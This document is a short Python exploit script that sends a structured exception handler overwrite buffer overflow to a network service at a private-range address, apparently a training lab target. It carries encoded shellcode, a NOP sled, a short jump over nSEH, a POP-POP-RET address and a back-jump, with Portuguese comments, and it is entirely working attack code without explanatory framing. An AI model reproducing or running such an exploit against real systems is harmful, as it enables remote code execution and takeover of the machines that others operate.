#!/usr/bin/python
# -*- coding: utf-8 -*-

#badchars= \x00\x0a\x29\x50

import sys, socket
from struct import *

host = "192.168.50.158"
port = 7274

size = 4423

buf =  b""
buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x76\xea\x23\xbc\x83\xee\xfc\xe2\xf4"
buf += b"\x8a\x02\xa1\xbc\x76\xea\x43\x35\x93\xdb\xe3\xd8"
buf += b"\xfd\xba\x13\x37\x24\xe6\xa8\xee\x62\x61\x51\x94"
buf += b"\x79\x5d\x69\x9a\x47\x15\x8f\x80\x17\x96\x21\x90"
buf += b"\x56\x2b\xec\xb1\x77\x2d\xc1\x4e\x24\xbd\xa8\xee"
buf += b"\x66\x61\x69\x80\xfd\xa6\x32\xc4\x95\xa2\x22\x6d"
buf += b"\x27\x61\x7a\x9c\x77\x39\xa8\xf5\x6e\x09\x19\xf5"
buf += b"\xfd\xde\xa8\xbd\xa0\xdb\xdc\x10\xb7\x25\x2e\xbd"
buf += b"\xb1\xd2\xc3\xc9\x80\xe9\x5e\x44\x4d\x97\x07\xc9"
buf += b"\x92\xb2\xa8\xe4\x52\xeb\xf0\xda\xfd\xe6\x68\x37"
buf += b"\x2e\xf6\x22\x6f\xfd\xee\xa8\xbd\xa6\x63\x67\x98"
buf += b"\x52\xb1\x78\xdd\x2f\xb0\x72\x43\x96\xb5\x7c\xe6"
buf += b"\xfd\xf8\xc8\x31\x2b\x82\x10\x8e\x76\xea\x4b\xcb"
buf += b"\x05\xd8\x7c\xe8\x1e\xa6\x54\x9a\x71\x15\xf6\x04"
buf += b"\xe6\xeb\x23\xbc\x5f\x2e\x77\xec\x1e\xc3\xa3\xd7"
buf += b"\x76\x15\xf6\xec\x26\xba\x73\xfc\x26\xaa\x73\xd4"
buf += b"\x9c\xe5\xfc\x5c\x89\x3f\xb4\xd6\x73\x82\xe3\x14"
buf += b"\x44\x2f\x4b\xbe\x76\xfa\xc2\x35\x90\x80\x33\xea"
buf += b"\x21\x82\xba\x19\x02\x8b\xdc\x69\xf3\x2a\x57\xb0"
buf += b"\x89\xa4\x2b\xc9\x9a\x82\xd3\x09\xd4\xbc\xdc\x69"
buf += b"\x1e\x89\x4e\xd8\x76\x63\xc0\xeb\x21\xbd\x12\x4a"
buf += b"\x1c\xf8\x7a\xea\x94\x17\x45\x7b\x32\xce\x1f\xbd"
buf += b"\x77\x67\x67\x98\x66\x2c\x23\xf8\x22\xba\x75\xea"
buf += b"\x20\xac\x75\xf2\x20\xbc\x70\xea\x1e\x93\xef\x83"
buf += b"\xf0\x15\xf6\x35\x96\xa4\x75\xfa\x89\xda\x4b\xb4"
buf += b"\xf1\xf7\x43\x43\xa3\x51\xd3\x09\xd4\xbc\x4b\x1a"
buf += b"\xe3\x57\xbe\x43\xa3\xd6\x25\xc0\x7c\x6a\xd8\x5c"
buf += b"\x03\xef\x98\xfb\x65\x98\x4c\xd6\x76\xb9\xdc\x69"

offset = "\x90" * 150
offset += buf
offset += "A" * (4423 - len(offset))

nseh  = "\x90\x90" # nops
nseh += "\xeb\x06" # JMP SHORT 0X08

seh = pack('<L',0x727417EA)  # ->  PPR

shellcode  = "\x90" * 8
shellcode += "\xE9\x2F\xEF\xFF\xFF" # JMP BACK PRA ESPACO MAIOR
shellcode += "\x90" * 8

payload = offset + nseh + seh + shellcode

buffer = "EXPLOIT2 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))
print("Enviando %d bytes..." % (len(buffer)))
exp.send(buffer)

exp.close()